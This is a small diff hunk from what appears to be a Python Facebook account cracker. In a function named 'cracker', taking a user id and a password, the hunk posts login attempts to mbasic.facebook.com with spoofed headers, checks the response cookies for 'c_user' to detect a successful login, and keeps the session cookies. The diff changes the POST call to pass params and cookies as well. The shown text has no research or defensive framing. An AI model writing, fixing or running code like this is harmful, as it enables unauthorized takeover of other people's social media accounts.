@@ -2154,7 +2154,7 @@ def cracker(uid, pwx, tl):
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://mbasic.facebook.com/async/wbloks/fetch/"
-            po = Session.post(url, data=data, headers=headers).text
+            po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
